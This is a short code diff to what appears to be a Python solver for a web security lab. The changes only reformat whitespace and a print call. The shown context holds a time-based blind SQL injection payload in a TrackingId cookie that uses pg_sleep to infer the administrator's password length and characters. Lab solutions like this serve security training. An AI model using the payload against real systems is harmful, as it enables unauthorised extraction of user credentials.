@@ -62,7 +62,7 @@ def solve_lab(url, proxies):
         cookies = {
             "TrackingId": f"' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN pg_sleep(10) ELSE pg_sleep(0) END --"
         }
-        
+
         start = time.perf_counter()
         requests.get(url, proxies=proxies, verify=False, cookies=cookies)
         end = time.perf_counter()
@@ -95,7 +95,10 @@ def solve_lab(url, proxies):
             response_time = end - start
 
             if response_time < 10:
-                print_info(f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}...", end="")
+                print_info(
+                    f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}...",
+                    end="",
+                )
             else:
                 print_success(
                     f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}...",
